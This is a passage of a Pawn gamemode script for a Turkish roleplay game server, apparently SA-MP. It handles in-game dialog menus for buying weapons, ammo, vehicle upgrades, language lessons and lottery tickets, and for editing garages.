			}
		    if(listitem == 1)
		    {
				GivePlayerWeapon(playerid, 42, 1500);
				SetPlayerAmmo(playerid, WEAPON_FIREEXTINGUISHER, 1500);
			}
			if(listitem == 8)
			{
			    ResetPlayerWeapons(playerid);
			}
		}
		return 1;
	}
	if(dialogid == 309)
	{
	    if(response)
		{
		    new _om = GetPVarInt(playerid, "OrnekMekan"),_say=-1,_omid;
		    switch(_om)
			{
				case 2:
			    {
       				for(new i;i<MAX_INTERIORS;i++)
					{
						if(Interior[i][inttur] == 2)
					    {
         					_say++;
					        if(_say == listitem)
					        {
								_omid = i;
					            break;
							}
						}
					}
				}
     			case 3:
			    {
			    	for(new i;i<MAX_INTERIORS;i++)
					{
						if(Interior[i][inttur] == 3)
					    {
					    	_say++;
					        if(_say == listitem)
					        {
								_omid = i;
					            break;
							}
						}
		    		}
				}
			}
			SetPVarInt(playerid, "IntAlID", _omid);
		    ShowPlayerDialog(playerid, 366, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Interior", "Gez\nSatýn Al", "Seç", "Ýptal");
		}
		return 1;
	}
	if(dialogid == 310)
	{
	    if(response)
	    {
	    	new _renkt[12],vid;
	    	vid = GetNearestVehicle(playerid);
			format(_renkt, 12, "%s", inputtext);
			new ___bol[2][16];
			strexplode(___bol, _renkt, ",");
			Arac[vid][arenk1] = strval(___bol[0]);
			Arac[vid][arenk2] = strval(___bol[1]);
			ChangeVehicleColor(vid, strval(___bol[0]), strval(___bol[1]));
	    }
	    return 1;
	}
	if(dialogid == 311)
	{
	    if(response)
	    {
	        switch(GetPVarInt(playerid, "NeSeciyor"))
	        {
	            case 1: SectigiKilit[playerid] = listitem;
	            case 2: SectigiAlarm[playerid] = listitem;
	            case 3: SectigiImmo[playerid] = listitem;
	        }
	        AracSatinalMenu(playerid);
	    }
	    return 1;
	}
	if(dialogid == 312)
	{
	    if(response)
	    {
	        switch(GetPVarInt(playerid, "NeSeciyor"))
	        {
	            case 1: SectigiKilit[playerid] = listitem;
	            case 2: SectigiAlarm[playerid] = listitem;
	            case 3: SectigiImmo[playerid] = listitem;
	        }
	        AracGelistir(playerid);
	    }
	    return 1;
	}
	if(dialogid == 313)
	{
	    if(response)
	    {
	        switch(listitem)
	        {
	            case 0:
	            {
	                if(SectigiHizSabit[playerid] == 1)
	                {
	                    SectigiHizSabit[playerid] = 0;
	                }
	                else
	                {
	                    SectigiHizSabit[playerid] = 1;
	                }
	                AracGelistir(playerid);
	            }
	            case 1: KilitSecEx(playerid);
	            case 2: AlarmSecEx(playerid);
	            case 3: ImmoSecEx(playerid);
	            case 5:
	            {
	                if(!IsPlayerInAnyVehicle(playerid)) return Hata(playerid, "Aracýn içerisinde deðilsiniz.");
					if(GetPlayerCash(playerid) < GetPVarInt(playerid, "GelistirFiyat")) return Hata(playerid, "Yeterli paranýz yok.");
					new _vid=GetPlayerVehicleID(playerid);
					GivePlayerCash(playerid, -GetPVarInt(playerid, "GelistirFiyat"));
					Arac[_vid][akilittip] = SectigiKilit[playerid];
					Arac[_vid][aalarm] = SectigiAlarm[playerid];
					Arac[_vid][aimmo] = SectigiImmo[playerid];
					Arac[_vid][ahizsabit] = SectigiHizSabit[playerid];
	            }
	        }
	    }
	    return 1;
	}
	if(dialogid == 314)
	{
	    if(response)
	    {
	        gPBTeam[playerid] = listitem+1;
	        if(listitem == 0)
	        {
	            SetPlayerPos(playerid, 793.9719,-2461.8828,1089.3918);
	            SetPlayerInterior(playerid, 1);
	            SetPlayerVirtualWorld(playerid, 1);
	            SetPlayerSkin(playerid, 287);
	            SetPlayerFacingAngle(playerid, 289.9264);
	            SetPlayerTeam(playerid, 3);
	            Bilgi(playerid, "A Takýmýný seçtiniz.");
	        }
	        else if(listitem == 1)
			{
			    SetPlayerPos(playerid, 1162.6658,-2352.6187,1089.3176);
	            SetPlayerInterior(playerid, 1);
	            SetPlayerVirtualWorld(playerid, 1);
	            SetPlayerSkin(playerid, 285);
	            SetPlayerFacingAngle(playerid, 89.1144);
	            SetPlayerTeam(playerid, 4);
	            Bilgi(playerid, "B Takýmýný seçtiniz.");
			}
			SetPlayerHealth(playerid, 100);
			SetPlayerArmour(playerid, 50);
	    }
	    return 1;
	}
	if(dialogid == 315)
	{
		if(response)
		{
		    new sure=gettime();
      		//if(sure-Karakter[playerid][dilsure] < 172800) return Hata(playerid, "2 günde bir derse katýlabilirsiniz.");
		    switch(listitem)
		    {
		        case 0:
		        {
		            if(Karakter[playerid][dil] == 1 || Karakter[playerid][alm] == 10) return Hata(playerid, "Bu dili zaten biliyorsunuz.");
					if(GetPlayerCash(playerid) < 5000) return Hata(playerid, "Yeterli miktarda paranýz yok.");
					GivePlayerCash(playerid, -5000);
					DilOgren(playerid, 1);
		        }
		        case 1:
		        {
		            if(Karakter[playerid][dil] == 2 || Karakter[playerid][arp] == 10) return Hata(playerid, "Bu dili zaten biliyorsunuz.");
					if(GetPlayerCash(playerid) < 5000) return Hata(playerid, "Yeterli miktarda paranýz yok.");
					GivePlayerCash(playerid, -5000);
					DilOgren(playerid, 2);
		        }
		        case 2:
		        {
		            if(Karakter[playerid][dil] == 3 || Karakter[playerid][cin] == 10) return Hata(playerid, "Bu dili zaten biliyorsunuz.");
					if(GetPlayerCash(playerid) < 5000) return Hata(playerid, "Yeterli miktarda paranýz yok.");
					GivePlayerCash(playerid, -5000);
					DilOgren(playerid, 3);
		        }
		        case 3:
		        {
		            if(Karakter[playerid][dil] == 4 || Karakter[playerid][fra] == 10) return Hata(playerid, "Bu dili zaten biliyorsunuz.");
					if(GetPlayerCash(playerid) < 5000) return Hata(playerid, "Yeterli miktarda paranýz yok.");
					GivePlayerCash(playerid, -5000);
    				DilOgren(playerid, 4);
		        }
		        case 4:
		        {
		            return Hata(playerid, "Bu dili zaten biliyorsunuz.");
		        }
		        case 5:
		        {
		            if(Karakter[playerid][dil] == 5 || Karakter[playerid][isp] == 10) return Hata(playerid, "Bu dili zaten biliyorsunuz.");
					if(GetPlayerCash(playerid) < 5000) return Hata(playerid, "Yeterli miktarda paranýz yok.");
					GivePlayerCash(playerid, -5000);
					DilOgren(playerid, 5);
		        }
		        case 6:
		        {
		            if(Karakter[playerid][dil] == 6 || Karakter[playerid][ita] == 10) return Hata(playerid, "Bu dili zaten biliyorsunuz.");
					if(GetPlayerCash(playerid) < 5000) return Hata(playerid, "Yeterli miktarda paranýz yok.");
					GivePlayerCash(playerid, -5000);
					DilOgren(playerid, 6);
		        }
		        case 7:
		        {
		            if(Karakter[playerid][dil] == 7 || Karakter[playerid][japon] == 10) return Hata(playerid, "Bu dili zaten biliyorsunuz.");
					if(GetPlayerCash(playerid) < 5000) return Hata(playerid, "Yeterli miktarda paranýz yok.");
					GivePlayerCash(playerid, -5000);
					DilOgren(playerid, 7);
		        }
		        case 8:
		        {
		            if(Karakter[playerid][dil] == 8 || Karakter[playerid][rus] == 10) return Hata(playerid, "Bu dili zaten biliyorsunuz.");
					if(GetPlayerCash(playerid) < 5000) return Hata(playerid, "Yeterli miktarda paranýz yok.");
					GivePlayerCash(playerid, -5000);
					DilOgren(playerid, 8);
		        }
		        case 9:
		        {
		            if(Karakter[playerid][dil] == 9 || Karakter[playerid][ibra] == 10) return Hata(playerid, "Bu dili zaten biliyorsunuz.");
					if(GetPlayerCash(playerid) < 5000) return Hata(playerid, "Yeterli miktarda paranýz yok.");
					GivePlayerCash(playerid, -5000);
					DilOgren(playerid, 9);
		        }
		        case 10:
		        {
		            if(Karakter[playerid][dil] == 10 || Karakter[playerid][yunan] == 10) return Hata(playerid, "Bu dili zaten biliyorsunuz.");
					if(GetPlayerCash(playerid) < 5000) return Hata(playerid, "Yeterli miktarda paranýz yok.");
					GivePlayerCash(playerid, -5000);
					DilOgren(playerid, 10);
		        }
		        case 11:
		        {
		            if(Karakter[playerid][dil] == 11 || Karakter[playerid][ermen] == 10) return Hata(playerid, "Bu dili zaten biliyorsunuz.");
					if(GetPlayerCash(playerid) < 5000) return Hata(playerid, "Yeterli miktarda paranýz yok.");
					GivePlayerCash(playerid, -5000);
					DilOgren(playerid, 11);
		        }
		        case 12:
		        {
		            if(Karakter[playerid][dil] == 12 || Karakter[playerid][slovak] == 10) return Hata(playerid, "Bu dili zaten biliyorsunuz.");
					if(GetPlayerCash(playerid) < 5000) return Hata(playerid, "Yeterli miktarda paranýz yok.");
					GivePlayerCash(playerid, -5000);
					DilOgren(playerid, 12);
		        }
		        case 13:
		        {
		            if(Karakter[playerid][dil] == 13 || Karakter[playerid][irlan] == 10) return Hata(playerid, "Bu dili zaten biliyorsunuz.");
					if(GetPlayerCash(playerid) < 5000) return Hata(playerid, "Yeterli miktarda paranýz yok.");
					GivePlayerCash(playerid, -5000);
					DilOgren(playerid, 13);
		        }
		        case 14:
		        {
		            if(Karakter[playerid][dil] == 14 || Karakter[playerid][porte] == 10) return Hata(playerid, "Bu dili zaten biliyorsunuz.");
					if(GetPlayerCash(playerid) < 5000) return Hata(playerid, "Yeterli miktarda paranýz yok.");
					GivePlayerCash(playerid, -5000);
					DilOgren(playerid, 14);
		        }
		        case 15:
		        {
		            if(Karakter[playerid][dil] == 15 || Karakter[playerid][sirp] == 10) return Hata(playerid, "Bu dili zaten biliyorsunuz.");
					if(GetPlayerCash(playerid) < 5000) return Hata(playerid, "Yeterli miktarda paranýz yok.");
					GivePlayerCash(playerid, -5000);
					DilOgren(playerid, 15);
		        }
		        case 16:
		        {
		            if(Karakter[playerid][dil] == 16 || Karakter[playerid][arnavut] == 10) return Hata(playerid, "Bu dili zaten biliyorsunuz.");
					if(GetPlayerCash(playerid) < 5000) return Hata(playerid, "Yeterli miktarda paranýz yok.");
					GivePlayerCash(playerid, -5000);
					DilOgren(playerid, 16);
		        }
		    }
		    Karakter[playerid][dilsure] = sure;
		}
		return 1;
	}
	if(dialogid == 316)
	{
	    if(response)
		{
			new _sno = GetPVarInt(playerid, "MermiAlNo");
			new _id, mstring[128];
			foreach(new i : Guns)
			{
			    if(OyuncuSilah[i][no] == _sno)
			    {
			        _id = i;
			        break;
			    }
			}
			for(new i;i<sizeof(MermiVerileri);i++)
			{
			    if(MermiVerileri[i][0] == OyuncuSilah[_id][silahid])
			    {
			        if(GetPlayerCash(playerid) < MermiVerileri[i][2]) return Hata(playerid, "Üzerinizde yeterli para yok.");
					OyuncuSilah[_id][mermi] = MermiVerileri[i][1];
					GivePlayerCash(playerid, -MermiVerileri[i][2]);
					OyuncuSilahKaydetEx(_id);
					format(mstring, sizeof(mstring), "%d nolu %s silahýnýza %d mermi aldýnýz.", _sno, SilahIsim(MermiVerileri[i][0]), MermiVerileri[i][1]);
					Bilgi(playerid, mstring);
					return 1;
			    }
			}
		}
		return 1;
	}
	if(dialogid == 317)
	{
	    if(response)
	    {
	        new _id=GetPVarInt(playerid, "GDuzenle");
	        switch(listitem)
	        {
	            case 0: GarajDuzenle(playerid, _id);//id
	            case 1: GarajDuzenle(playerid, _id);//x
	            case 2: GarajDuzenle(playerid, _id);//y
	            case 3: GarajDuzenle(playerid, _id);//z
	            case 4: GarajDuzenle(playerid, _id);//vw
	            case 5: GarajDuzenle(playerid, _id);//int
	            case 6: ShowPlayerDialog(playerid, 318, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Garaj Düzenle", "Ýnterior 1\nÝnterior 2\nÝnterior 3", "Deðiþtir", "Ýptal");
	            case 7: ShowPlayerDialog(playerid, 319, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Garaj Düzenle", "Garajýn yeni sahibini girin[sqlid]:", "Deðiþtir", "Ýptal");
	            case 8: ShowPlayerDialog(playerid, 320, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Garaj Düzenle", "Garajýn yeni birliðini girin[birlikid]:", "Deðiþtir", "Ýptal");
	            case 9: ShowPlayerDialog(playerid, 321, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Garaj Düzenle", "Garajýn yeni ismini girin[max32karakter]:", "Deðiþtir", "Ýptal");
	            case 10: //kilit
	            {
	                switch(Garaj[_id][gkilit])
	                {
	                    case 0:
	                    {
							Garaj[_id][gkilit] = 1;
							Bilgi(playerid, "Garajý kilitlediniz.");
	                    }
	                    case 1:
	                    {
	                        Garaj[_id][gkilit] = 0;
							Bilgi(playerid, "Garajýn kilidini açtýnýz.");
	                    }
	                }
	                GarajDuzenle(playerid, _id);
	                GarajKaydet(_id);
	            }
		        case 11://aracpos
		        {
		            if(!IsPlayerInAnyVehicle(playerid))
					{
						Hata(playerid, "Aracýn içerisinde deðilsiniz.");
						GarajDuzenle(playerid,_id);
						return 1;
					}
					new Float:vPos[4],vehid=GetPlayerVehicleID(playerid);
					GetVehiclePos(vehid, vPos[0],vPos[1],vPos[2]);
					GetVehicleZAngle(vehid, vPos[3]);
					Garaj[_id][gax] = vPos[0];
					Garaj[_id][gay] = vPos[1];
					Garaj[_id][gaz] = vPos[2];
					Garaj[_id][garz] = vPos[3];
					new mstring[64];
					format(mstring, sizeof(mstring), "%d idli garajýn araç çýkýþ yerini ayarladýnýz.",_id);
					Bilgi(playerid, mstring);
					GarajDuzenle(playerid, _id);
	    			GarajKaydet(_id);
	        	}
			}
	    }
	    return 1;
	}
	if(dialogid == 318)
	{
	    new _id=GetPVarInt(playerid, "GDuzenle");
	    if(response)
	    {
	        Garaj[_id][gicint] = listitem+1;
			new mstring[64];
			format(mstring, sizeof(mstring), "Garajýn içeri interiorunu %d olarak deðiþtirdiniz.",listitem+1);
			Bilgi(playerid, mstring);
			GarajDuzenle(playerid, _id);
			GarajKaydet(_id);
	    }
	    return 1;
	}
	if(dialogid == 319)
	{
	    new _id=GetPVarInt(playerid, "GDuzenle");
	    if(response)
	    {
	        Garaj[_id][gsahip] = strval(inputtext);
	        Garaj[_id][gbirlik] = -1;
			new mstring[64];
			format(mstring, sizeof(mstring), "Garajýn sahibini %s olarak deðiþtirdiniz.",SQLFromName(strval(inputtext)));
			Bilgi(playerid, mstring);
			GarajDuzenle(playerid, _id);
			GarajKaydet(_id);
	    }
	    return 1;
	}
	if(dialogid == 320)
	{
	    new _id=GetPVarInt(playerid, "GDuzenle");
	    if(response)
	    {
	        Garaj[_id][gsahip] = -1;
	        Garaj[_id][gbirlik] = strval(inputtext);
			new mstring[64];
			format(mstring, sizeof(mstring), "Garajýn birlðini %s olarak deðiþtirdiniz.",Birlik[strval(inputtext)][fisim]);
			Bilgi(playerid, mstring);
			GarajDuzenle(playerid, _id);
			GarajKaydet(_id);
	    }
	    return 1;
	}
	if(dialogid == 321)
	{
		new _id=GetPVarInt(playerid, "GDuzenle");
	    if(response)
	    {
	        if(strlen(inputtext) > 32) return GarajDuzenle(playerid, _id);
	        format(Garaj[_id][gisim], 32, "%s", inputtext);
	        new mstring[128];
			format(mstring, sizeof(mstring), "Garajýn ismini %s olarak deðiþtirdiniz.",inputtext);
			Bilgi(playerid, mstring);
			format(mstring, sizeof(mstring), "{435761}GARAJ\n\n{FFFFFF}%s",Garaj[_id][gisim]);
			UpdateDynamic3DTextLabelText(Garaj[_id][glabel], 0xFFFF, mstring);
			GarajDuzenle(playerid, _id);
			GarajKaydet(_id);
	    }
	    return 1;
	}
	if(dialogid == 322)
	{
	    if(response)
	    {
			new _sid;
			switch(listitem)
			{
				case 0: _sid=70;
				case 1: _sid=71;
				case 2: _sid=25501;
				case 3: _sid=25502;
				case 4: _sid=25503;
				case 5: _sid=25508;
				case 6: _sid=25510;
				case 7: _sid=25512;
			}
			SetPlayerSkin(playerid,_sid);
			Karakter[playerid][isbasiskin] = _sid;
			SetPlayerColor(playerid, COLOR_LSMC);
			Karakter[playerid][medisbasi] = 1;
   			new targetrank[32];
			switch(Karakter[playerid][rutbe])
			{
				case 0: targetrank = "Sivil";
				case 1: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe1]);
				case 2: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe2]);
		 		case 3: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe3]);
		  		case 4: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe4]);
		   		case 5: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe5]);
		   		case 6: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe6]);
				case 7: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe7]);
				case 8: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe8]);
				case 9: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe9]);
				case 10: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe10]);
				case 11: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe11]);
				case 12: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe12]);
				case 13: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe13]);
				case 14: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe14]);
				case 15: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe15]);
				case 16: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe16]);
				case 17: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe17]);
				case 18: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe18]);
				case 19: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe19]);
				case 20: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe20]);
			}
			format(targetrank, 32, "[%s]", targetrank);
			if(Karakter[playerid][rutbe] <= 20) UpdateDynamic3DTextLabelText(gRutbeIsim[playerid], COLOR_LSMC, targetrank);
	    }
	    return 1;
	}
	if(dialogid == 323)
	{
	    if(response)
	    {
			new _sid;
			switch(listitem)
			{
				case 0: _sid=25500;
				case 1: _sid=25505;
				case 2: _sid=25506;
				case 3: _sid=25507;
				case 4: _sid=25509;
				case 5: _sid=25511;
				case 6: _sid=25513;
			}
			SetPlayerSkin(playerid,_sid);
			Karakter[playerid][isbasiskin] = _sid;
			SetPlayerColor(playerid, COLOR_LSMC);
			Karakter[playerid][medisbasi] = 1;
   			new targetrank[32];
			switch(Karakter[playerid][rutbe])
			{
				case 0: targetrank = "Sivil";
				case 1: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe1]);
				case 2: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe2]);
		 		case 3: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe3]);
		  		case 4: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe4]);
		   		case 5: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe5]);
		   		case 6: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe6]);
				case 7: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe7]);
				case 8: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe8]);
				case 9: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe9]);
				case 10: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe10]);
				case 11: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe11]);
				case 12: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe12]);
				case 13: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe13]);
				case 14: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe14]);
				case 15: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe15]);
				case 16: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe16]);
				case 17: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe17]);
				case 18: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe18]);
				case 19: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe19]);
				case 20: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe20]);
			}
			format(targetrank, 32, "[%s]", targetrank);
			if(Karakter[playerid][rutbe] <= 20) UpdateDynamic3DTextLabelText(gRutbeIsim[playerid], COLOR_LSMC, targetrank);
	    }
	    return 1;
	}
	/*if(dialogid == 801)
	{
	    if(response)
	    {
			new _sid;
			switch(listitem)
			{
				case 0: _sid=276;
				case 1: _sid=274;
				case 2: _sid=275;
				case 3: _sid=71;
				case 4: _sid=25508;
				case 5: _sid=25510;
				case 6: _sid=25512;
			}
			SetPlayerSkin(playerid,_sid);
			Karakter[playerid][isbasiskin] = _sid;
			SetPlayerColor(playerid, COLOR_LSFD);
			Karakter[playerid][fdisbasi] = 1;
      		new targetrank[32];
			switch(Karakter[playerid][rutbe])
			{
				case 0: targetrank = "Sivil";
				case 1: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe1]);
				case 2: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe2]);
		 		case 3: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe3]);
		  		case 4: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe4]);
		   		case 5: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe5]);
		   		case 6: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe6]);
				case 7: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe7]);
				case 8: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe8]);
				case 9: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe9]);
				case 10: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe10]);
				case 11: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe11]);
				case 12: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe12]);
				case 13: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe13]);
				case 14: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe14]);
				case 15: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe15]);
				case 16: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe16]);
				case 17: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe17]);
				case 18: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe18]);
				case 19: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe19]);
				case 20: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe20]);
			}
			format(targetrank, 32, "[%s]", targetrank);
			if(Karakter[playerid][rutbe] <= 20) UpdateDynamic3DTextLabelText(gRutbeIsim[playerid], COLOR_LSFD, targetrank);
	    }
	    return 1;
	}
	if(dialogid == 802)
	{
	    if(response)
	    {
			new _sid;
			switch(listitem)
			{
				case 0: _sid=308;
				case 1: _sid=25509;
				case 2: _sid=25511;
				case 3: _sid=25513;
			}
			SetPlayerSkin(playerid,_sid);
			Karakter[playerid][isbasiskin] = _sid;
			SetPlayerColor(playerid, COLOR_LSFD);
			Karakter[playerid][fdisbasi] = 1;
   			new targetrank[32];
			switch(Karakter[playerid][rutbe])
			{
			case 0: targetrank = "Sivil";
			case 1: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe1]);
			case 2: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe2]);
	 		case 3: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe3]);
	  		case 4: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe4]);
	   		case 5: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe5]);
	   		case 6: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe6]);
			case 7: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe7]);
			case 8: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe8]);
			case 9: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe9]);
			case 10: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe10]);
			case 11: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe11]);
			case 12: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe12]);
			case 13: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe13]);
			case 14: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe14]);
			case 15: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe15]);
			case 16: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe16]);
			case 17: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe17]);
			case 18: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe18]);
			case 19: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe19]);
			case 20: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe20]);
			}
			format(targetrank, 32, "[%s]", targetrank);
			if(Karakter[playerid][rutbe] <= 20) UpdateDynamic3DTextLabelText(gRutbeIsim[playerid], COLOR_LSFD, targetrank);
	    }
	    return 1;
	}*/
	if(dialogid == 324)
	{
	    if(response)
	    {
	        switch(listitem)
	        {
	            case 0:
	            {
	                if(BankaPara(playerid) < 100) return Hata(playerid, "Bankanýzda yeterli miktarda para yok.");
					new mstring[128],nstring[7];
					format(nstring, sizeof(nstring), "%d%d%d%d",
					randomEx(1,9), randomEx(1,9), randomEx(1,9), randomEx(1,9));
					format(mstring, sizeof(mstring), "Tam bilet aldýnýz, bilet numaranýz %d.",strval(nstring));
					Bilgi(playerid, mstring);
					Ipucu(playerid, "''/biletlerim'' yazarak biletlerinizi görebilirsiniz.");
					BiletVer(playerid, strval(nstring),1);
					BankaParaDuzen(playerid, BankaPara(playerid)-100);
				}
				case 1:
	            {
	                if(BankaPara(playerid) < 50) return Hata(playerid, "Bankanýzda yeterli miktarda para yok.");
					new mstring[128],nstring[7];
					format(nstring, sizeof(nstring), "%d%d%d%d",
					randomEx(1,9), randomEx(1,9), randomEx(1,9), randomEx(1,9));
					format(mstring, sizeof(mstring), "Yarým bilet aldýnýz, bilet numaranýz %d.",strval(nstring));
					Bilgi(playerid, mstring);
					Ipucu(playerid, "''/biletlerim'' yazarak biletlerinizi görebilirsiniz.");
					BiletVer(playerid, strval(nstring),2);
					BankaParaDuzen(playerid, BankaPara(playerid)-50);
				}
				case 2:
	            {
	                if(BankaPara(playerid) < 25) return Hata(playerid, "Bankanýzda yeterli miktarda para yok.");
					new mstring[128],nstring[7];
					format(nstring, sizeof(nstring), "%d%d%d%d",
					randomEx(1,9), randomEx(1,9), randomEx(1,9), randomEx(1,9));
					format(mstring, sizeof(mstring), "Çeyrek bilet aldýnýz, bilet numaranýz %d.",strval(nstring));
					Bilgi(playerid, mstring);
					Ipucu(playerid, "''/biletlerim'' yazarak biletlerinizi görebilirsiniz.");
					BiletVer(playerid, strval(nstring),3);
					BankaParaDuzen(playerid, BankaPara(playerid)-25);
				}
	        }
	    }
	    return 1;
	}
	if(dialogid == 325)
	{
	    if(response)
	    {
			new _say=-1;
			foreach(new i : Guns)
			{
				if(OyuncuSilah[i][oyuncuid] == Karakter[playerid][sqlid])
				{
				    if(OyuncuSilah[i][durum] != 1) continue;
				    _say++;
				    if(_say == listitem)
				    {
				        if(IsPlayerInAnyVehicle(playerid))
					    {
					        Hata(playerid, "Araç içerisinde bu eylemi yapamazsýnýz.");
					        return 1;
						}
					    for (new ix = 0; ix < 13; ix++)
						{
					  		GetPlayerWeaponData(playerid, ix, weapons2[ix][0], weapons2[ix][1]);
					  		if(weapons2[ix][0] != 0) return Hata(playerid, "Elinizde zaten bir silah var.");
						}
      					if(OyuncuSilah[i][mermi] == 0) return Hata(playerid, "Silahýn mermisi yok.");
						SilahKullaniyor[playerid] = i;
						GivePlayerWeapon(playerid, OyuncuSilah[i][silahid], OyuncuSilah[i][mermi]);
						return 1;
					}
				}
			}
	    }
	    return 1;
	}
	if(dialogid == 326)
	{
	    if(response)
	    {
			switch(listitem)
			{
				case 0:
				{
				    if(IsPlayerConnected(playerid))
				    {
				    	if(GetPlayerCash(playerid) < 250000) return Hata(playerid, "Yeterli paranýz yok.");
				    	new query[1024];
						format(query, sizeof(query), "INSERT INTO `araclar` (`model`) VALUES ('%d')", SectigiArac[playerid]);
			           	new Cache:cache = mysql_query(query,true);
			           	new new_vehicle_sql_id = cache_insert_id();
						cache_delete(cache);
						new vehicleid = CreateVehicle(446, 909.7927, -2130.8782, -0.3997, 0.0, 0, 0, -1, 0);

						if(IsValidVehicle(vehicleid))
						{
						    Arac[vehicleid][aid] = new_vehicle_sql_id;
						    Arac[vehicleid][amodel] = 446;
						    Arac[vehicleid][arenk1] = 0;
						    Arac[vehicleid][arenk2] = 0;
